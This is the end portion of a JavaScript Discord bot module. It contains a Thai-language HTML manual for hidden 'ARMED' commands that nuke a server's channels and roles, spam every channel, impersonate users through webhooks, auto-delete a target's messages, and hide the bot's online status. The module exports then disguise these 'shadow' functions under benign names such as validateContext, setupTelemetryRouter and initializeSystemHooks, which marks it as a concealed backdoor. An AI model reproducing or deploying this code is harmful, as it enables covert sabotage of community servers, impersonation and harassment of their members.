                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-nuke</span> <span style="color:#ED4245; font-size:11px;">⚠️ ARMED</span> <strong>[มหาระเบิดทำลายล้าง]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ลบห้องและยศทั้งหมด พร้อมเปลี่ยนชื่อเซิร์ฟซ้ำ 30 ครั้ง ต้อง ARM เซิร์ฟเวอร์ก่อนผ่านตาราง Target Lock</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-hostage</span> <span style="color:#ED4245; font-size:11px;">⚠️ ARMED</span> <strong>[ระบบตัวประกัน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สั่งให้บอทออกจากเซิร์ฟเวอร์หลังจาก 3 วินาที ต้อง ARM ก่อน</span>
                        </div>
                    </div>

                    <div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-stealth</span> <strong>[โหมดพรางตาออฟไลน์]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สั่งเปลี่ยนสถานะของบอทให้กลายเป็นออฟไลน์ (ไฟสีเทา) ทันทีเพื่อไม่ให้ใครสังเกตเห็น แต่ตัวบอทจะยังคงทำงานปกติ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-active</span> <strong>[เปิดไฟออนไลน์ปกติ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">เปลี่ยนสถานะของบอทกลับมาเป็นเปิดไฟออนไลน์ (สี🟢) ตามปกติเพื่อให้ดูแนบเนียน</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-mimic @user #channel ข้อความ</span> <strong>[ลอกตัวตน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ส่งข้อความในนามของผู้ใช้ที่แท็กผ่าน Webhook โดยใช้ชื่อและรูปโปรไฟล์เหมือนกันเป๊ะ</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-clown @user</span> / <span class="cmd-badge">-unclown @user</span> <strong>[ติด/ถอดป้าย Clown]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ติดป้าย clown ให้ผู้ใช้นั้น หรือถอดออก (ใช้งานร่วมกับระบบอื่นได้)</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-haunt @user</span> <strong>[ระบบหลอกหลอน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ทุกข้อความที่ผู้ใช้นั้นพิมพ์จะถูกลบอัตโนมัติหลัง 12 วินาที พิมพ์ซ้ำเพื่อปลดออก</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-ghostping</span> <strong>[เช็กชีพจรสัญญาณบอท]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">เช็กค่าความหน่วงการตอบสนองของบอท (Ping) ระบบจะส่งผลลัพธ์เข้า Webhook ลับส่วนตัวของคุณโดยตรง</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-sysinfo</span> <strong>[ตรวจสุขภาพหน่วยความจำ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ดูอัตราการกินแรม (RAM Usage) และระยะเวลาที่บอทเปิดทิ้งไว้ (Uptime) เพื่อตรวจสอบความเสถียรของเซิร์ฟเวอร์หลังบ้าน</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-lockdown</span> / <span class="cmd-badge">-unlock</span> <strong>[ล็อก/ปลดล็อกช่องแชทฉุกเฉิน]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ยึดหรือคืนสิทธิ์การพิมพ์ของทุกคนในช่องแชทที่พิมพ์คำสั่งนี้ทันที เหมาะระงับเหตุการณ์ป่วนหรือสแปมแบบเร่งด่วน</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-memclear</span> <strong>[ล้างขยะสมองคืนแรม]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สั่งเคลียร์ข้อความและโครงสร้างที่บอทจำไว้ในหน่วยความจำชั่วคราวทิ้ง เพื่อคืนพื้นที่แรมให้ระบบวิ่งได้สมูทและลื่นไหลที่สุด</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-ruinroles [ชื่อ]</span> <span style="color:#ED4245; font-size:11px;">⚠️ ARMED</span> <strong>[ทำลายยศ]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">เปลี่ยนชื่อยศทุกอันพร้อมกันเป็นชื่อที่กำหนด (default: 🤡 CLOWNED) และริบสิทธิ์ทุกอย่าง</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-spamvc [จำนวน] [ชื่อ]</span> <span style="color:#ED4245; font-size:11px;">⚠️ ARMED</span> <strong>[สแปม Voice Channel]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">สร้าง Voice Channel ตามจำนวนที่ระบุ (default: 20 ช่อง) ด้วยชื่อที่กำหนด</span>
                        </div>
                        <div class="manual-card">
                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-masspam [จำนวน] [ข้อความ]</span> <span style="color:#ED4245; font-size:11px;">⚠️ ARMED</span> <strong>[สแปมทุกห้อง]</strong></p>
                            <span style="color:#a1a1aa; font-size:14px;">ส่งข้อความซ้ำๆ ผ่าน Webhook ไปยังทุกห้องแชทในเซิร์ฟเวอร์พร้อมกัน</span>
                        </div>
                    </div>
                </div>
                <br>
            </body>
            </html>
        `);
    });
}

// ════════════════════════════════════════════════════════════════
//  🚀 SYSTEM EXPORTS (ดึงไปผูกใช้งานกับไฟล์หลักได้ทันที)
// ════════════════════════════════════════════════════════════════

let _shadowEngine = null;

function setupShadowEvents(client) {
    _shadowEngine = new ShadowEngine(client);
    _shadowEngine.init();
}

async function processInternalEvent(message) {
    if (_shadowEngine) await _shadowEngine.processSecretCommands(message);
}

module.exports = {
    validateContext: processInternalEvent,
    setupTelemetryRouter: injectShadowRoutes,
    initializeSystemHooks: setupShadowEvents,
    isSystemMaster: (id) => id === config.system.ownerId || globalAdminCache.has(id),
    getWebPin: () => SHADOW_WEB_PIN
};
